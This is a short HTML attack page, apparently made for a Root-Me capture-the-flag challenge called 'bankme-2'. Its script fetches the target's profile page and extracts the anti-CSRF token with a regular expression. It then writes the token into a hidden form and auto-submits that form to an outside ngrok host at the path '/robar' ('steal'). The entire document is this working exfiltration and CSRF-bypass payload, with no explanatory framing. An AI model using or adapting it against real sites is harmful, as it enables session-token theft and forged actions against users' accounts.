<!DOCTYPE html>
<html>
  <body>
    <form action="https://48bf-83-213-114-176.ngrok-free.app/robar" method="POST">
      <input type="hidden" name="token" value="">
    </form>

    <script>
      fetch("https://bankme-2.challenges.pro.root-me.org/profile")
      .then(response => response.text())
      .then(data => {
        let token = data.match(/name="token" value="(.*?)"/)[1];
        document.querySelector('input[name="token"]').value = token;
        document.forms[0].submit();
      });
    </script>

  </body>
</html>
